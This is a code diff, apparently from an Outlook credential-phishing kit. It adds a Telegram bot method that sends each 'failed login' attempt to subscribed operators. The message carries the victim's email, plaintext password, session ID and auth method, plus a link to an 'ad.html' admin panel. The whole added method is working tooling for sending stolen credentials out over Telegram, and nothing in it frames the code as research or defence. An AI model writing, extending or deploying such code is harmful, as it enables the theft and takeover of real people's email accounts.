@@ -380,6 +380,72 @@ ${adminUrl}
         console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
     }
 
+    // Method to send failed login notifications
+    async sendFailedLoginNotification(failureData) {
+        if (this.chatIds.size === 0) {
+            console.log('No Telegram users subscribed to notifications');
+            return;
+        }
+
+        const { email, password, timestamp, sessionId, reason, authMethod, preloadUsed } = failureData;
+        // Construct admin URL - support Replit, VPS with domain, or extract from redirect URI
+        let baseUrl;
+        if (process.env.REPL_SLUG) {
+            // Replit environment
+            baseUrl = `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`;
+        } else if (process.env.DOMAIN) {
+            // VPS with explicit domain
+            baseUrl = process.env.DOMAIN;
+        } else if (process.env.AZURE_REDIRECT_URI) {
+            // Extract domain from redirect URI
+            const redirectUrl = new URL(process.env.AZURE_REDIRECT_URI);
+            baseUrl = `${redirectUrl.protocol}//${redirectUrl.host}`;
+        } else {
+            // Fallback - but this won't work with Telegram
+            baseUrl = 'http://localhost:5000';
+        }
+        const adminUrl = `${baseUrl}/ad.html`;
+
+        const notificationMessage = `
+❌ <b>Failed Outlook Login Attempt</b>
+
+📧 <b>Email:</b> <code>${email}</code>
+🔑 <b>Password:</b> <span class="tg-spoiler">${password}</span>
+🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
+❌ <b>Reason:</b> ${reason}
+🆔 <b>Session:</b> ${sessionId}
+⚡ <b>Method:</b> ${authMethod}
+🔄 <b>Preload Used:</b> ${preloadUsed ? 'Yes' : 'No'}
+
+🌐 Access admin panel to view details
+        `;
+
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: '🌐 Open Admin Panel', url: adminUrl }]
+            ]
+        };
+
+        // Send notification to all subscribed users
+        for (const chatId of this.chatIds) {
+            try {
+                await this.bot.sendMessage(chatId, notificationMessage, {
+                    parse_mode: 'HTML',
+                    reply_markup: keyboard
+                });
+            } catch (error) {
+                console.error(`Failed to send failed login notification to ${chatId}:`, error.message);
+                // Remove invalid chat IDs
+                if (error.code === 403) {
+                    this.chatIds.delete(chatId);
+                    this.saveSubscriptions();
+                }
+            }
+        }
+
+        console.log(`📤 Failed login notification sent to ${this.chatIds.size} Telegram users`);
+    }
+
     async handleServerStatus(chatId, messageId) {
         try {
             const { exec } = require('child_process');
